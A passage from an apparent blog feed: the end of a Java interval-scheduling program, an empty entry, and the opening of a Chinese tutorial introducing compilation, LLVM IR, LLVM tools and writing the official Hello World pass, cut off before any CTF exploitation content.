class="hljs-keyword">if</span> (isS2[i]&gt;isF[j]){<br>                    isP[i]=j;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        computeOpt(isV2,isM,isP,isN-<span class="hljs-number">1</span>);<br>        findSolutions(isM,isV2,isR,isP,isN-<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            StdDraw.setPenColor(StdDraw.BLUE);<br>            StdDraw.text(isSX[i],isSY[i],<span class="hljs-string">""</span>+isV2[i]);<br>            <span class="hljs-keyword">if</span> (isR[i]==<span class="hljs-number">1</span>){<br>                StdDraw.setPenColor(StdDraw.RED);<br>                StdDraw.line(isS2[i],isY2[i],isF[i],isY2[i]);<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                StdDraw.setPenColor(StdDraw.BLACK);<br>                StdDraw.line(isS2[i],isY2[i],isF[i],isY2[i]);<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">computeOpt</span><span class="hljs-params">(<span class="hljs-type">int</span>[] V,<span class="hljs-type">int</span>[] M,<span class="hljs-type">int</span>[] P,<span class="hljs-type">int</span> j)</span> {<br>        <span class="hljs-keyword">if</span> (j &lt;= -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-type">int</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> computeOpt(V, M, P, P[j]);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">d2</span> <span class="hljs-operator">=</span> computeOpt(V, M, P, j - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> ((V[j] + d1) &lt; d2) {<br>                M[j]=d2;<br>                <span class="hljs-keyword">return</span> d2;<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                M[j]=V[j]+d1;<br>                <span class="hljs-keyword">return</span> (V[j]+d1);<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findSolutions</span><span class="hljs-params">(<span class="hljs-type">int</span>[] M,<span class="hljs-type">int</span>[] V,<span class="hljs-type">int</span>[] R,<span class="hljs-type">int</span>[] P,<span class="hljs-type">int</span> j)</span>{<br>        <span class="hljs-type">int</span> i=j;<br>        <span class="hljs-type">int</span> d1,d2,d3=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i&gt;=<span class="hljs-number">0</span>){<br>            <span class="hljs-keyword">if</span> (P[i]==-<span class="hljs-number">1</span>)<br>                d1=d3+V[i];<br>            <span class="hljs-keyword">else</span> {<br>                d1=d3+V[i]+M[P[i]];<br>            }<br>            <span class="hljs-keyword">if</span> (d1==M[j]){<br>                R[i]=<span class="hljs-number">1</span>;<br>                d3=d3+V[i];<br>                i=P[i];<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                i=i-<span class="hljs-number">1</span>;<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;算法与程序设计实验&lt;/h1&gt;
&lt;p&gt;要求&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.复现代码，写上自己的注释&lt;/p&gt;
&lt;p&gt;2.结果展示&lt;/p&gt;
&lt;p&gt;3.将代码进行修改，bug修改，内容提升&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;第二章&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="算法与程序设计" scheme="https://kylinxin.github.io/categories/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="算法与程序设计实验" scheme="https://kylinxin.github.io/tags/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>LLVM PASS PWN（二）</title>
    <link href="https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%20(%E4%BA%8C)/"/>
    <id>https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%20(%E4%BA%8C)/</id>
    <published>2023-10-28T15:14:29.000Z</published>
    <updated>2023-10-28T15:02:55.367Z</updated>
    
    <content type="html"><![CDATA[<h1>LLVM PASS PWN（二）</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;LLVM PASS PWN（二）&lt;/h1&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
</summary>
      
    
    
    
    <category term="LLVM PASS PWN" scheme="https://kylinxin.github.io/categories/LLVM-PASS-PWN/"/>
    
    
    <category term="LLVM PASS PWN（二）" scheme="https://kylinxin.github.io/tags/LLVM-PASS-PWN%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>LLVM PASS PWN（一）</title>
    <link href="https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2023-10-28T15:14:29.000Z</published>
    <updated>2023-10-28T14:56:33.522Z</updated>
    
    <content type="html"><![CDATA[<h1>LLVM PASS PWN（一）</h1><h2 id="前置知识简述"><a href="#前置知识简述" class="headerlink" title="前置知识简述"></a>前置知识简述</h2><h3 id="为什么要编译程序"><a href="#为什么要编译程序" class="headerlink" title="为什么要编译程序"></a>为什么要编译程序</h3><p>机器语言是用1和0组成的代码，但机器是识别不了1和0的，更具体的是如何识别的呢？对机器电路进行设计之后，机器能识别高电平还是低电平，刚好与2进制很相似，想输入0就给机器输入低电平，想输入1，就给机器输入高电平，所以就看到了1和0的表示形式</p><p>机器语言它是计算机唯一能识别和执行的语言，但它的直观性差，可读性差，比如一串<code>11110000111100001111</code>机器可以快速识别是什么但是我们很难理解，再比如我们想要在屏幕上输出hello world那我们该如何用二进制来表示呢，所以汇编语言就诞生了</p><p>汇编语言用助记符来表示机器指令中的操作码和操作数的指令系统，如a = 1，我们不需要去用二进制来理解，我们完全可以利用mov a, 1进行理解，那有没有更简单的方法呢，比如现在要输出hello wrold，还是需要十几行的汇编代码的，所以高级语言就诞生了</p><p>高级语言是一种更接近人类的自然语言和数学语言的语言，比如想要a = 1，很直观就是a = 1，在很大程度上减少编程人员的编写量</p><p>但是问题来了，机器只懂0和1那怎么才能让高级语言被机器识别，所以就有了编译，将高级语言（源语言）翻译成汇编语言或机器语言（目标语言），编译的根本目的就是把源代码变成目标代码</p><h3 id="编译的过程是什么"><a href="#编译的过程是什么" class="headerlink" title="编译的过程是什么"></a>编译的过程是什么</h3><p>编译过程主要可以划分为前端与后端，笔者用一张图简述一下</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/UiPnzvrVDGfkLhm.png'><img src="https://s2.loli.net/2023/10/28/UiPnzvrVDGfkLhm.png" alt="image.png"></p><p>前端把源代码翻译成IR，后端把IR编译成目标平台的机器码，这里笔者在查阅资料的时候发现有些会将生成中间代码放入前端，而有些资料会将生成中间代码放入后端</p><p>在词法分析中编译器读入源代码，经过词法分析器识别出Token，比如词法分析器中识别出的Token可以是<code>int, return, {, }</code>等</p><p>在语法分析中会把上面的Token串给转换成一个抽象语法树AST，AST树反映了程序的语法结构</p><p>在语义分析中需要做的任务是理解语义，语句要做什么，如for是需要去实现循环，if是判断等</p><p>在前端完成之后，会生成中间代码，统一优化中间代码，再去将中间代码生成目标代码</p><p>前置知识这里笔者简述了一下，具体的可以移步编译原理</p><ul><li><h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><h3 id="LLVM-IR-LLVM-Pass"><a href="#LLVM-IR-LLVM-Pass" class="headerlink" title="LLVM-IR-LLVM-Pass"></a>LLVM IR &amp; LLVM Pass</h3><p><code>gcc</code>这个最经典的编译器提供的是一整套服务，前端和后端耦合在了一起，导致了如果一个新的编程语言出现可能需要设计一个新的IR以及实现这个IR的后端，如果出现了一个新的平台就要实现一个从自己的IR到新平台的后端，针对此类问题就出现了LLVM</p><p>不同的前后端使用统一的中间代码，这样一个新的编程语言出现只需要实现一个新的前端，如果出现了一个新的平台只需要实现一个新的后端</p><p>LLVM IR有三种表示形式</p><ul><li>可读IR，类似汇编代码，可以给人看的，后缀<code>.ll</code></li><li>不可读二进制IR，后缀<code>.bc</code></li><li>保存在内存中，内存格式</li></ul><p>LLVM Pass 是一个框架设计，是LLVM系统里重要的组成部分，因为LLVM Pass负责LLVM编译器绝大部分的工作，一系列的Pass组合，构建了编译器的转换和优化部分，抽象成结构化的编译器代码。</p><p>在实现上，LLVM的核心库中会给你一些 Pass类 去继承。你需要实现它的一些方法。 最后使用LLVM的编译器会把它翻译得到的IR传入Pass里，给你遍历和修改。</p><p>LLVM Pass的用处是插桩，机器无关的代码优化，静态分析，代码混淆等</p><h3 id="LLVM-工具"><a href="#LLVM-工具" class="headerlink" title="LLVM-工具"></a>LLVM 工具</h3><p>以下内容来自<a href="https://zhuanlan.zhihu.com/p/122522485">LLVM Pass入门导引</a></p><ul><li><code>llvm-as</code>：把LLVM IR从人类能看懂的文本格式汇编成二进制格式。注意：此处得到的<strong>不是</strong>目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是LLVM IR的二进制格式，而不是机器码。</li><li><code>opt</code>：优化LLVM IR。输出新的LLVM IR。</li><li><code>llc</code>：把LLVM IR编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行LLVM IR。</li></ul><h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>Clang 是 LLVM 的前端，可以用来编译 C，C++，ObjectiveC 等语言。Clang 的功能包括：词法分析、语法分析、语义分析、生成中间中间代码LLVM Intermediate Representation (LLVM IR)。</p><h2 id="LLVM-Clang环境安装-工具测试"><a href="#LLVM-Clang环境安装-工具测试" class="headerlink" title="LLVM-Clang环境安装-工具测试"></a>LLVM &amp; Clang环境安装 &amp; 工具测试</h2><p>ubuntu20.04下安装LLVM + Clang如下</p><blockquote><p>sudo apt install clang-12</p><p>sudo apt install clang-8</p><p>sudo apt install llvm-12</p><p>sudo apt install llvm-8</p></blockquote><p>llvm-12安装之后可以使用opt-12，今年的ciscn的LLVM PASS PWN就是opt-12，一般题目都会给出opt的版本。ubuntu20.04应该自带opt-10如果没有的话，<code>sudo apt install clang-10 &amp;&amp; sudo apt install llvm-10</code></p><p>上面的做题环境都安装完成之后，先写一个c文件，利用Clang将c文件编译成<code>.ll, .bc</code>等格式看一下是否是如上所说，c文件如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>{<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"hello world"</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"plz input your name"</span>);<br>    read(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x1F</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"biubiubiu"</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>首先是<code>.c-&gt;.ll</code>，<code>clang-12 -emit-llvm -S test.c -o test.ll</code>，test.ll(生成的IR文本文件)如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs asm">; ModuleID = 'test.c'<br>source_filename = "test.c"<br>target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"<br>target triple = "x86_64-pc-linux-gnu"<br><br>@.str = private unnamed_addr constant [12 x i8] c"hello world\00", align 1<br>@.str.1 = private unnamed_addr constant [20 x i8] c"plz input your name\00", align 1<br>@.str.2 = private unnamed_addr constant [10 x i8] c"biubiubiu\00", align 1<br><br>; Function Attrs: noinline nounwind optnone uwtable<br>define dso_local i32 @main(i32 %0, i8** %1) #0 {<br>  %3 = alloca i32, align 4<br>  %4 = alloca i32, align 4<br>  %5 = alloca i8**, align 8<br>  %6 = alloca [32 x i8], align 16<br>  store i32 0, i32* %3, align 4<br>  store i32 %0, i32* %4, align 4<br>  store i8** %1, i8*** %5, align 8<br>  %7 = call i32 @puts(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))<br>  %8 = call i32 @puts(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))<br>  %9 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0<br>  %10 = call i64 @read(i32 0, i8* %9, i64 31)<br>  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))<br>  ret i32 0<br>}<br><br>declare dso_local i32 @puts(i8*) #1<br><br>declare dso_local i64 @read(i32, i8*, i64) #1<br><br>declare dso_local i32 @printf(i8*, ...) #1<br><br>attributes #0 = { noinline nounwind optnone uwtable "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }<br>attributes #1 = { "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }<br><br>!llvm.module.flags = !{!0}<br>!llvm.ident = !{!1}<br><br>!0 = !{i32 1, !"wchar_size", i32 4}<br>!1 = !{!"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5"}<br></code></pre></td></tr></tbody></table></figure><p>上面的IR很直观，之前提到LLVM PASS的一个用处是优化IR代码，会将上面的可以优化的进行优化</p><p>其次是<code>.c-&gt;.bc</code>，<code>clang-12 -emit-llvm -c test.c -o test.bc</code>，bc是不可读二进制</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221014183446-d2d19954-4bab-1.png" class='item-img' data-src='https://xzfile.aliyuncs.com/media/upload/picture/20221014183446-d2d19954-4bab-1.png'><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221014183446-d2d19954-4bab-1.png" alt="img"></a></p><p>然后是<code>.ll -&gt; .bc</code>，<code>llvm-as test.ll -o test.bc</code>，结果和上面的一样</p><p>接着是<code>.bc - &gt; .ll</code>，<code>llvm-dis test.bc -o test.ll</code>，同上</p><p>最后还有一个<code>.bc -&gt; .s</code>， <code>llc test.bc -o test.s</code>，将字节码的二进制格式文件转换为本地的汇编文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text<br>    .file   "test.c"<br>    .globl  main                    # -- Begin function main<br>    .p2align    4, 0x90<br>    .type   main,@function<br>main:                                   # @main<br>    .cfi_startproc<br># %bb.0:<br>    pushq   %rbp<br>    .cfi_def_cfa_offset 16<br>    .cfi_offset %rbp, -16<br>    movq    %rsp, %rbp<br>    .cfi_def_cfa_register %rbp<br>    subq    $48, %rsp<br>    movl    $0, -8(%rbp)<br>    movl    %edi, -4(%rbp)<br>    movq    %rsi, -16(%rbp)<br>    movabsq $.L.str, %rdi<br>    callq   puts<br>    movabsq $.L.str.1, %rdi<br>    callq   puts<br>    leaq    -48(%rbp), %rsi<br>    xorl    %edi, %edi<br>    movl    $31, %edx<br>    callq   read<br>    movabsq $.L.str.2, %rdi<br>    movb    $0, %al<br>    callq   printf<br>    xorl    %eax, %eax<br>    addq    $48, %rsp<br>    popq    %rbp<br>    .cfi_def_cfa %rsp, 8<br>    retq<br>.Lfunc_end0:<br>    .size   main, .Lfunc_end0-main<br>    .cfi_endproc<br>                                        # -- End function<br>    .type   .L.str,@object          # @.str<br>    .section    .rodata.str1.1,"aMS",@progbits,1<br>.L.str:<br>    .asciz  "hello world"<br>    .size   .L.str, 12<br><br>    .type   .L.str.1,@object        # @.str.1<br>.L.str.1:<br>    .asciz  "plz input your name"<br>    .size   .L.str.1, 20<br><br>    .type   .L.str.2,@object        # @.str.2<br>.L.str.2:<br>    .asciz  "biubiubiu"<br>    .size   .L.str.2, 10<br><br>    .ident  "Ubuntu clang version 12.0.0-3ubuntu1~20.04.5"<br>    .section    ".note.GNU-stack","",@progbits<br></code></pre></td></tr></tbody></table></figure><h2 id="编写第一个LLVM-Pass"><a href="#编写第一个LLVM-Pass" class="headerlink" title="编写第一个LLVM-Pass"></a>编写第一个LLVM Pass</h2><p>通过前面的知识之后，现在可以尝试编写“hello world”的pass，下面是<a href="https://llvm.org/docs/WritingAnLLVMPass.html">官方</a>的示例</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/Pass.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/IR/Function.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/Support/raw_ostream.h"</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/IR/LegacyPassManager.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/Transforms/IPO/PassManagerBuilder.h"</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> {<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Hello</span> : <span class="hljs-keyword">public</span> FunctionPass {<br>  <span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br>  <span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) {}<br><br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>{<br>    <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">"Hello: "</span>;<br>    <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">'\n'</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  }<br>}; <span class="hljs-comment">// end of struct Hello</span><br>}  <span class="hljs-comment">// end of anonymous namespace</span><br><br><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"Hello World Pass"</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Only looks at CFG */</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Analysis Pass */</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       legacy::PassManagerBase &amp;PM) { PM.add(<span class="hljs-keyword">new</span> Hello()); })</span></span>;<br></code></pre></td></tr></tbody></table></figure><p>先声明pass本身，然后声明了一个<code>Hello</code>类，它是FunctionPass的子类。稍后将详细描述不同的内置pass子类，但是现在知道FunctionPass一次对一个函数进行操作。</p><p>然后声明了LLVM用于标识pass的pass标识符。 这允许LLVM避免使用昂贵的C ++运行时信息，如下</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br><span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) {}<br></code></pre></td></tr></tbody></table></figure><p>然后声明了一个runOnFunction方法，它覆盖了从FunctionPass继承的抽象虚方法。 这是我们应该做的事情，所以我们只用每个函数的名称打印出我们的消息。代码如下</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>{<br>    <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">"Hello: "</span>;<br>    <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">'\n'</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  }<br>}; <span class="hljs-comment">// end of struct Hello</span><br>}  <span class="hljs-comment">// end of anonymous namespace</span><br></code></pre></td></tr></tbody></table></figure><p>接着初始化passID。 LLVM使用ID的地址来标识pass，因此初始化值并不重要。代码如下</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br></code></pre></td></tr></tbody></table></figure><p>最后，我们注册我们的类Hello，给它一个命令行参数“hello”，并命名为“Hello World Pass”。 最后两个参数描述了它的行为：如果传递遍历CFG而不修改它，那么第三个参数设置为true; 如果pass是分析pass，例如支配树pass，则提供true作为第四个参数。代码如下</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"Hello World Pass"</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Only looks at CFG */</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Analysis Pass */</span>)</span></span>;<br></code></pre></td></tr></tbody></table></figure><p>如果我们想将通道注册为现有管道的一个步骤，则提供了一些扩展点，例如<code>PassManagerBuilder::EP_EarlyAsPossible</code>在任何优化之前应用我们的通道，或者<code>PassManagerBuilder::EP_FullLinkTimeOptimizationLast</code> 在链接时间优化之后应用它。代码如下</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> llvm::RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    llvm::PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> llvm::PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       llvm::legacy::PassManagerBase &amp;PM) { PM.add(<span class="hljs-keyword">new</span> Hello()); })</span></span>;<br></code></pre></td></tr></tbody></table></figure><p>现在需要将这个Pass编译成模块，使用如下命令即可</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">clang<span class="hljs-number">-12</span> `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`<br></code></pre></td></tr></tbody></table></figure><p>现在应该会看到LLVMHello.so这个文件，通过官方文档可知需要使用以下命令</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">opt -load LLVMHello.so -hello test.ll<br></code></pre></td></tr></tbody></table></figure><p>这里的 -hello由Hello.cpp中的<code>static RegisterPass&lt;Hello&gt; X</code>参数决定</p><p>但是笔者这里报了一个错<code>Error opening 'LLVMHello.so': LLVMHello.so: cannot open shared object file: No such file or directory</code>，<a href="http://xn--linuxLLVMHello-zw7v050cxyshfbme6m579ritpyubl75fv72mz3wa3r6g.so">这是因为linux无法在默认地址找到LLVMHello.so</a>，解决很简单`sudo cp <a href="http://LLVMHello.so">LLVMHello.so</a> /lib</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/XWF4LHKzkSwchIb.png'><img src="https://s2.loli.net/2023/10/28/XWF4LHKzkSwchIb.png" alt="image.png"></p><p>成功输出test.c所有函数名称</p><h2 id="对第一个LLVM-Pass逆向分析"><a href="#对第一个LLVM-Pass逆向分析" class="headerlink" title="对第一个LLVM-Pass逆向分析"></a>对第一个LLVM 